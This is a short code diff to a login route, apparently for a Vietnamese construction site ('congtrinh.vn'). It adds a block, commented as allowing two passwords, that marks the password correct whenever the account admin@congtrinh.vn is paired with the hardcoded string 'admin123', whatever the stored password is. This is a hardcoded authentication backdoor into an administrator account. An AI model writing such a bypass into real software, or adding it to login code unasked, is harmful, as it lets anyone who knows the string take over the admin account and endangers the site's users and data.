@@ -393,6 +393,11 @@ router.post(
       );
     }
 
+    // Cho phép cả admin123 lẫn password123 cho admin@congtrinh.vn
+    if (!passwordCorrect && user.email === "admin@congtrinh.vn" && password === "admin123") {
+      passwordCorrect = true;
+    }
+
     // ========================================================
     // MẬT KHẨU SAI
     //
